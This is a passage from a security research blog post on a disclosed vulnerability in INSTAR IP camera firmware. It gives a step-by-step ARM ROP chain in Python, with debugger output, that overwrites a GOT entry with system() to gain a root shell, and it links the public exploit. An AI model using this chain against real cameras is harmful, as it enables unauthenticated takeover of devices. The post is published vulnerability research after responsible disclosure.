</span></span><span><span><span>(</span>remote<span>)</span> gef➤  x/wx 0x400c8
</span></span><span><span>0x400c8 &lt;isalnum@got.plt&gt;:      0x76ba86f0
</span></span><span><span><span>(</span>remote<span>)</span> gef➤  x/8i 0x76ba86f0
</span></span><span><span>   0x76ba86f0 &lt;isalnum&gt;:        ldr     r3, <span>[</span>pc, <span>#24]   @ 0x76ba8710 &lt;isalnum+32&gt;</span>
</span></span><span><span>   0x76ba86f4 &lt;isalnum+4&gt;:      mrc     15, 0, r2, cr13, cr0, <span>{</span>3<span>}</span>
</span></span><span><span>   0x76ba86f8 &lt;isalnum+8&gt;:      lsl     r0, r0, <span>#1</span>
</span></span><span><span>   0x76ba86fc &lt;isalnum+12&gt;:     ldr     r3, <span>[</span>pc, r3<span>]</span>
</span></span><span><span>   0x76ba8700 &lt;isalnum+16&gt;:     ldr     r3, <span>[</span>r2, r3<span>]</span>
</span></span><span><span>   0x76ba8704 &lt;isalnum+20&gt;:     ldrh    r0, <span>[</span>r3, r0<span>]</span>
</span></span><span><span>   0x76ba8708 &lt;isalnum+24&gt;:     and     r0, r0, <span>#8</span>
</span></span><span><span>   0x76ba870c &lt;isalnum+28&gt;:     bx      lr
</span></span></code></pre></td></tr></tbody></table></div></div><p>As you can see the GOT entry is at <code>0x400c8</code> which points to the actual address of <code>isalnum</code> at <code>0x76ba86f0</code> within libc.</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span><span>7
</span><span>8
</span><span>9
</span></code></pre></td><td><pre tabindex="0"><code data-lang="shell"><span><span><span>(</span>remote<span>)</span> gef➤  info <span>function</span> system
</span></span><span><span>All functions matching regular expression <span>&#34;system&#34;</span>:
</span></span><span><span>
</span></span><span><span>Non-debugging symbols:
</span></span><span><span>0x000147c4  std::_V2::system_category<span>()</span>@plt
</span></span><span><span><span>[</span>...<span>]</span>
</span></span><span><span>0x76bbb920  __libc_system
</span></span><span><span>0x76bbb920  system
</span></span><span><span>0x76c83fac  svcerr_systemerr
</span></span></code></pre></td></tr></tbody></table></div></div><p>Let’s see how far apart that <code>isalnum</code> (0x76ba86f0) and <code>system</code> (0x76bbb920) are.</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span></code></pre></td><td><pre tabindex="0"><code data-lang="python"><span><span><span>&gt;&gt;&gt;</span> <span>hex</span><span>(</span><span>0x76bbb920</span> <span>-</span> <span>0x76ba86f0</span><span>)</span>
</span></span><span><span><span>&#39;0x13230&#39;</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>So that means that if we can add 0x13230 to the address at <code>isalnum@got</code> we have the address of <code>system</code>.</p><h3 id="gadgets-gadgets--and-more-gadgets">Gadgets, Gadgets and more Gadgets</h3><p>Now to the tedious part. The only thing between the high-level plan and RCE was a bunch of gadgets, right? I initially tried tools such as <code>angrop</code><sup id="fnref:8"><a href="#fn:8" role="doc-noteref">8</a></sup> to find and automatically chain gadgets, but ARM assembly offers many different, often multi-instruction ways to perform simple operations, e.g. add to a register or move values between registers. Those tools handle obvious, straightforward gadgets well, but they struggle once the gadget sequences become more complex. So in the end I reverted to manually searching and chaining gadgets with <code>Ropper</code><sup id="fnref:9"><a href="#fn:9" role="doc-noteref">9</a></sup>.</p><p>If no short, straightforward gadgets are available, you must resort to longer ones. Typically, the longer a gadget is, the more side effects it has, for example, overwriting registers or changing the stack pointer. The challenge is therefore to find gadgets that implement the required primitive while introducing only manageable side effects that later gadgets can correct.</p><p>The most crucial gadget in my chain was the one to add two values, preferably fully controllable. This would let me add the calculated offset to the address at <code>isalnum@got</code> to get the address of <code>system</code>. While there were a couple of gadgets to add static values like 0x1 or 0x2 to a register, these didn’t seem very useful because either a loop would be required to call them many times or the chain would become too long to reach the desired value. So I tried to find gadgets that added values from two registers such as the following one.</p><pre tabindex="0"><code># 0x000228d8: add r6, fp, r6; ldrb sb, [ip, #1]; ldr sl, [ip, #2]; blx r3;
</code></pre><p>Let’s break that down:</p><ul><li><code>add r6, fp, r6</code>: Adds fp (r11) and r6, stores result in r6</li><li><code>ldrb sb, [ip, #1]</code>: Dereferences ip (r12) + 1 byte, stores result in sb (r9)</li><li><code>ldr sl, [ip, #2]</code>: Dereferences ip (r12) + 2 word, stores result in sl (r10)</li><li><code>blx r3</code>: Jumps to r3</li></ul><p>As you can see here side effects can also mean that certain registers have to contain certain values beforehand. In this case ip (r12) has to contain a valid address that can be dereferenced. If that’s not the case, the program will crash.</p><p>So we have a gadget that allows us to add fp (r11) and r6. Ideally we want the address of <code>isalnum</code> in r6 and the offset we calculated earlier in fp (r11) giving us the address of <code>system</code> in r6 as an output of the gadget. But how do we get the address of <code>isalnum</code> into r6? The address of <code>isalnum@got</code> is known so we need a gadget to dereference it to obtain the address of <code>isalnum</code> within libc.</p><p>To accomplish this, let’s have a look at this gadget:</p><pre tabindex="0"><code># 0x000190ac: ldr r6, [r3, #0x10]; ldr r3, [r2, #4]; blx r3;
</code></pre><p>Breakdown:</p><ul><li><code>ldr r6, [r3, #0x10]</code>: Dereferences (r3 + 0x10), stores result in r6</li><li><code>ldr r3, [r2, #4]</code>: Dereferences (r2 + 0x4), stores result in r3</li><li><code>blx r3;</code>: Jumps to r3</li></ul><p>Exactly what we need, but as you can tell this gadget needs some specific preparation beforehand. To continue the chain with <code>blx r3</code> we need to make sure <code>*(r2 + 0x4)</code> results in the next gadget of the chain. But that should be doable.</p><p>Last but not least we need a gadget to jump to the calculated address. Unfortunately I simply couldn’t find one. I also couldn’t find ways of moving the address into another register for which call gadgets would exist. So where to go from here? I recalled that the GOT of the target binary is actually writable. So what about writing it back to the GOT? If that works we could just call <code>isalnum@plt</code> which would then load the altered address from the GOT and jump to it.</p><p>Let’s try, here’s another gadget:</p><pre tabindex="0"><code># 0x0002a3f8: str r0, [r4, #4]; pop {r4, r5, r6, pc};
</code></pre><p>Breakdown:</p><ul><li><code>str r0, [r4, #4]</code>: Dereferences (r4 + 0x4) and stores value of r0</li><li><code>pop {r4, r5, r6, pc}</code>: Continues the chain</li></ul><p>This gadget enables us to store a value in r0 at <code>*(r4 + 0x4)</code>. Given that we find gadgets to move our calculated address into r0 and <code>isalnum@got - 0x4</code> into r4 this allows us to write the tampered address back to the GOT.</p><p>So if we could make everything line up the plan would be:</p><ul><li>Dereference <code>isalnum@got</code> entry and store it in r6</li><li>Add the calculated offset to <code>system</code> to the register r6</li><li>Write the register r6 back to the GOT -&gt; <code>isalnum@got</code></li><li>Prepare function arguments for <code>system</code></li><li>Call <code>isalnum@plt</code></li></ul><h3 id="building-the-chain">Building the Chain</h3><p>The path wasn’t as straightforward as this write-up might imply. I spent quite some time trying to mix and match gadgets and even exchanged the ones discussed above numerous times until I came up with the following chain. Let me walk you through it.</p><p>The function epilogue of the vulnerable base64 function conveniently allows us to populate r4 to r11 before jumping to the first gadget. So in this case I added some values to r6, r9 and r11 for later use.</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span></code></pre></td><td><pre tabindex="0"><code data-lang="python"><span><span><span>p</span> <span>=</span> <span>b</span><span>&#34;&#34;</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>516</span> <span>*</span> <span>b</span><span>&#34;A&#34;</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>b</span><span>&#34;BBBB&#34;</span> <span># r4</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>b</span><span>&#34;CCCC&#34;</span> <span># r5</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>p32</span><span>(</span><span>0x1cad0</span><span>)</span> <span># r6</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>b</span><span>&#34;EEEE&#34;</span> <span># r7</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>b</span><span>&#34;FFFF&#34;</span> <span># r8</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>p32</span><span>(</span><span>0x190ac</span><span>)</span> <span># r9 (sb)</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>b</span><span>&#34;HHHH&#34;</span> <span># r10 (sl)</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>p32</span><span>(</span><span>0x13230</span><span>)</span> <span># r11 (fp) -&gt; offset system - isalnum</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>As a first step of the chain, we do some preparations.</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span><span>12
</span><span>13
</span></code></pre></td><td><pre tabindex="0"><code data-lang="python"><span><span><span># 0x00028a08: mov r0, r6; pop {r4, r5, r6, pc};</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>p32</span><span>(</span><span>0x28a08</span><span>)</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>b</span><span>&#34;XXXX&#34;</span> <span># r4</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>b</span><span>&#34;XXXX&#34;</span> <span># r5</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>b</span><span>&#34;XXXX&#34;</span> <span># r6</span>
</span></span><span><span>
</span></span><span><span><span># 0x0001459c: pop {r3, pc};</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>p32</span><span>(</span><span>0x1459c</span><span>)</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>p32</span><span>(</span><span>ISALNUM_GOT</span> <span>-</span> <span>0x10</span><span>)</span> <span># r3</span>
</span></span><span><span>
</span></span><span><span><span># 0x0002a33c: mov r2, sp; str r0, [sp, #4]; mov r0, r3; blx sb;</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>p32</span><span>(</span><span>0x2a33c</span><span>)</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>b</span><span>&#34;AAAA&#34;</span> <span># &lt;- sp</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>What we do here is basically this:</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span></code></pre></td><td><pre tabindex="0"><code data-lang="python"><span><span><span>r0</span> <span>=</span> <span>r6</span> <span>=</span> <span>0x1cad0</span>
</span></span><span><span><span>r3</span> <span>=</span> <span>ISALNUM_GOT</span> <span>-</span> <span>0x10</span>
</span></span><span><span><span>r2</span> <span>=</span> <span>sp</span>
</span></span><span><span><span>*</span><span>(</span><span>sp</span> <span>+</span> <span>4</span><span>)</span> <span>=</span> <span>r0</span> <span>=</span> <span>0x1cad0</span>
</span></span><span><span><span>r0</span> <span>=</span> <span>r3</span> <span>=</span> <span>ISALNUM_GOT</span> <span>-</span> <span>0x10</span>
</span></span><span><span><span>*</span><span>(</span><span>0x190ac</span><span>)()</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>Note that we store <code>isalnum@got</code> in r3 so the following gadget can dereference it into r6. As discussed before we have to make sure that r2 contains a stack pointer so the chain can continue with <code>blx r3</code>.</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span></code></pre></td><td><pre tabindex="0"><code data-lang="python"><span><span><span># 0x000190ac: ldr r6, [r3, #0x10]; ldr r3, [r2, #4]; blx r3;</span>
</span></span></code></pre></td></tr></tbody></table></div></div><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td><td><pre tabindex="0"><code data-lang="python"><span><span><span>r6</span> <span>=</span> <span>*</span><span>(</span><span>r3</span> <span>+</span> <span>0x10</span><span>)</span> <span>=</span> <span>*</span><span>(</span><span>ISALNUM_GOT</span> <span>-</span> <span>0x10</span> <span>+</span> <span>0x10</span><span>)</span> <span>=</span> <span>*</span><span>ISALNUM_GOT</span>
</span></span><span><span><span>r3</span> <span>=</span> <span>*</span><span>(</span><span>r2</span> <span>+</span> <span>0x4</span><span>)</span> <span>=</span> <span>*</span><span>(</span><span>sp</span> <span>+</span> <span>0x4</span><span>)</span>
</span></span><span><span><span>*</span><span>(</span><span>sp</span> <span>+</span> <span>0x4</span><span>)()</span> <span># -&gt; 0x1cad0</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>As shown above <code>*(sp + 0x4)</code> is overwritten at runtime, so we need to make sure there is some scratch space on the stack so everything adds up properly.</p><p>When jumping to the gadget at 0x1cad0 the stack looks like this:</p><table><thead><tr><th>Address</th><th>Value</th><th></th></tr></thead><tbody><tr><td>0x1000FFF8</td><td>0x1459c</td><td></td></tr><tr><td>0x1000FFF4</td><td>0x1cad0</td><td></td></tr><tr><td>0x1000FFF0</td><td>AAAA</td><td>&lt;- stack pointer</td></tr></tbody></table><p>The stack pointer still points at the AAAA value. So we continue with some readjustments of the stack pointer and preparations of the r3 register.</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span></code></pre></td><td><pre tabindex="0"><code data-lang="python"><span><span><span># 0x0001cad0: pop {r4, r5, pc};</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>b</span><span>&#34;XXXX&#34;</span> <span># r5 (scratch space)</span>
</span></span><span><span>
</span></span><span><span><span># 0x0001459c: pop {r3, pc};</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>p32</span><span>(</span><span>0x1459c</span><span>)</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>p32</span><span>(</span><span>0x27d14</span><span>)</span> <span># r3</span>
</span></span></code></pre></td></tr></tbody></table></div></div><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span></code></pre></td><td><pre tabindex="0"><code data-lang="python"><span><span><span>r3</span> <span>=</span> <span>0x27d14</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>Next up is the discussed gadget to add <code>isalnum</code>’s address an the calculated offset. The offset was already put into fp (r11) at the very beginning of the chain. Register r6 also contains <code>isalnum</code>’s real address read from the GOT by now.</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span></code></pre></td><td><pre tabindex="0"><code data-lang="python"><span><span><span># 0x000228d8: add r6, fp, r6; ldrb sb, [ip, #1]; ldr sl, [ip, #2]; blx r3;</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>p32</span><span>(</span><span>0x228d8</span><span>)</span>
</span></span></code></pre></td></tr></tbody></table></div></div><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span></code></pre></td><td><pre tabindex="0"><code data-lang="python"><span><span><span>r6</span> <span>=</span> <span>r6</span> <span>+</span> <span>fp</span> <span>=</span> <span>*</span><span>ISALNUM_GOT</span> <span>+</span> <span>0x13230</span> <span>=</span> <span>system</span>
</span></span><span><span><span>sb</span> <span>=</span> <span>*</span><span>(</span><span>ip</span> <span>+</span> <span>0x1</span><span>)</span>
</span></span><span><span><span>sl</span> <span>=</span> <span>*</span><span>(</span><span>ip</span> <span>+</span> <span>0x2</span><span>)</span>
</span></span><span><span><span>*</span><span>(</span><span>0x27d14</span><span>)()</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>The ip register can be disregarded as it won’t be used later and conveniently contained an address that points to the stack. Since we’re just reading from it, it also doesn’t invoke any undesirable side effects.</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span></code></pre></td><td><pre tabindex="0"><code data-lang="python"><span><span><span># 0x00027d14: mov r0, r6; add sp, sp, #0x3c; pop {r4, r5, r6, r7, r8, sb, sl, fp, pc};</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>0x3c</span> <span>*</span> <span>b</span><span>&#34;P&#34;</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>p32</span><span>(</span><span>ISALNUM_GOT</span> <span>-</span> <span>4</span><span>)</span> <span># r4 -&gt; target - 4</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>b</span><span>&#34;XXXX&#34;</span> <span># r5</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>b</span><span>&#34;XXXX&#34;</span> <span># r6</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>b</span><span>&#34;XXXX&#34;</span> <span># r7</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>b</span><span>&#34;XXXX&#34;</span> <span># r8</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>b</span><span>&#34;XXXX&#34;</span> <span># sb</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>b</span><span>&#34;XXXX&#34;</span> <span># sl</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>b</span><span>&#34;XXXX&#34;</span> <span># fp</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>As a next step we have a gadget that moves r6 into r0. So we move the calculated address (= <code>system</code>) into r0. Also, we prepare the r4 register for the next step. To deal with the side effects of this gadget some more padding is added.</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td><td><pre tabindex="0"><code data-lang="python"><span><span><span>r0</span> <span>=</span> <span>r6</span> <span>=</span> <span>system</span>
</span></span><span><span><span>sp</span> <span>=</span> <span>sp</span> <span>+</span> <span>0x3c</span>
</span></span><span><span><span>r4</span> <span>=</span> <span>ISALNUM_GOT</span> <span>-</span> <span>4</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>Finally, we reach the gadget that writes our calculated <code>system</code> address back to the GOT.</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span></code></pre></td><td><pre tabindex="0"><code data-lang="python"><span><span><span># 0x0002a3f8: str r0, [r4, #4]; pop {r4, r5, r6, pc};</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>p32</span><span>(</span><span>0x2a3f8</span><span>)</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>b</span><span>&#34;XXXX&#34;</span> <span># r4</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>b</span><span>&#34;XXXX&#34;</span> <span># r5</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>p32</span><span>(</span><span>ISALNUM_PLT</span><span>)</span> <span># r6</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>To our convenience it also allows us to write <code>isalnum@plt</code> to r6.</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span></code></pre></td><td><pre tabindex="0"><code data-lang="python"><span><span><span>*</span><span>(</span><span>r4</span> <span>+</span> <span>0x4</span><span>)</span> <span>=</span> <span>r0</span> <span>=</span> <span>*</span><span>(</span><span>ISALNUM_GOT</span> <span>-</span> <span>0x4</span> <span>+</span> <span>0x4</span><span>)</span> <span>=</span> <span>system</span>
</span></span><span><span><span>r6</span> <span>=</span> <span>ISALNUM_PLT</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>From here there isn’t much left to do. We move the stack pointer into r0 (first argument) and then call r6 which we previously populated with the address of <code>system</code>.</p><div><div><table><tbody><tr><td><pre tabindex="0"><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span></code></pre></td><td><pre tabindex="0"><code data-lang="python"><span><span><span># 0x0001fb04: mov r0, sp; blx r6;</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>p32</span><span>(</span><span>0x1fb04</span><span>)</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>CMD</span><span>.</span><span>encode</span><span>()</span>
</span></span><span><span><span>p</span> <span>+=</span> <span>b</span><span>&#34;</span><span>\x00</span><span>&#34;</span>
</span></span></code></pre></td></tr></tbody></table></div></div><p>Let’s test things out:</p><figure><img src="http://tinylogger.com/static/no-leak-no-problem/shell.png"/><figcaption><h4>Final exploit to gain a root shell on target device</h4></figcaption></figure><p>RCE!</p><h3 id="why-didnt-you-just--">Why Didn’t You Just … ?</h3><p>Attentive readers might have noticed this is a 32-bit binary, so why not just brute-force the address of <code>system()</code>? This was indeed possible because the address space for 32-bit systems is significantly less than for 64-bit therefore the number of possible locations of libc is also a lot smaller. I used this approach for the first version of the exploit which worked fine. However, while probing for the correct address the exploit keeps crashing the target binary. If we think about a red team scenario this approach would be very noisy and should therefore be avoided. That’s why I decided to work out a more reliable exploit.</p><h2 id="wrapping-up">Wrapping up</h2><p>We’ve now walked the full path from firmware extraction and analysis, through vulnerability identification, and exploitation. I hope reading this was as enjoyable for you as the actual research was for me.</p><p>All vulnerabilities discovered during this research were reported through a responsible-disclosure process. Thanks to INSTAR for their prompt response, they fixed the issues and released an update within a short period of time. The 90-day disclosure period has elapsed, and along with this write-up the exploit is now publicly available <a href="https://github.com/born0monday/CVE-2025-8760/tree/main">here</a>.</p><div role="doc-endnotes"><hr/><ol><li id="fn:1"><p>Shodan INSTAR Search - <a href="https://www.shodan.io/search?query=http.favicon.hash%3A-1748763891">https://www.shodan.io/search?query=http.favicon.hash%3A-1748763891</a> <a href="#fnref:1" role="doc-backlink">↩︎</a></p></li><li id="fn:2"><p>INSTAR Wiki: Restore Firmware - <a href="https://wiki.instar.com/en/Advanced_User/Restore_Firmware/">https://wiki.instar.com/en/Advanced_User/Restore_Firmware/</a>) <a href="#fnref:2" role="doc-backlink">↩︎</a></p></li><li id="fn:3"><p>boofuzz Fuzzing Framework - <a href="https://github.com/jtpereyda/boofuzz">https://github.com/jtpereyda/boofuzz</a> <a href="#fnref:3" role="doc-backlink">↩︎</a></p></li><li id="fn:4"><p>INSTAR Advisory - <a href="https://modzero.com/static/MZ-25-03_modzero_INSTAR.pdf">https://modzero.com/static/MZ-25-03_modzero_INSTAR.pdf</a> <a href="#fnref:4" role="doc-backlink">↩︎</a></p></li><li id="fn:5"><p>ROPing our way to RCE - <a href="https://modzero.com/en/blog/roping-our-way-to-rce/">https://modzero.com/en/blog/roping-our-way-to-rce/</a> <a href="#fnref:5" role="doc-backlink">↩︎</a></p></li><li id="fn:6"><p>CTF Handbook Relocation Read-Only - <a href="https://ctf101.org/binary-exploitation/relocation-read-only/">https://ctf101.org/binary-exploitation/relocation-read-only/</a> <a href="#fnref:6" role="doc-backlink">↩︎</a></p></li><li id="fn:7"><p>Cybersecurity Notes PLT and GOT - <a href="https://ir0nstone.gitbook.io/notes/binexp/stack/aslr/plt_and_got">https://ir0nstone.gitbook.io/notes/binexp/stack/aslr/plt_and_got</a> <a href="#fnref:7" role="doc-backlink">↩︎</a></p></li><li id="fn:8"><p>angrop - <a href="https://github.com/angr/angrop">https://github.com/angr/angrop</a> <a href="#fnref:8" role="doc-backlink">↩︎</a></p></li><li id="fn:9"><p>Ropper - <a href="https://github.com/sashs/Ropper">https://github.com/sashs/Ropper</a> <a href="#fnref:9" role="doc-backlink">↩︎</a></p></li></ol></div></div></section><section><h2>Other News</h2><div><div><ul><li><a href="https://modzero.com/en/advisories/mz-25-03-instar/"><p><span>ADVISORY</span></p><h3>[MZ-25-03] INSTAR 2K+ and 4K Series</h3><p>August 12, 2025</p><p>Unauthenticated Remote Code Execution (RCE) in INSTAR 2K+ and 4K Series IP cameras</p></a></li></ul></div><div><ul><li><a href="https://modzero.com/en/blog/when-backups-open-backdoors-synology-active-backup-m365/"><p><span>DISCLOSURE</span></p><h3>When Backups Open Backdoors: Accessing Sensitive Cloud Data via &#34;Synology Active Backup for Microsoft 365&#34;</h3><p>June 27, 2025</p><p>A credential leaked by Synology allowed anyone unauthorized access to sensitive data of all Microsoft cloud tenants using “Active Backup for Microsoft 365” (ABM).</p></a></li></ul></div></div><div><p><a href="https://modzero.com/en/news/">All news ⟶</a></p></div></section></div></div></div>
  </body>
</html>
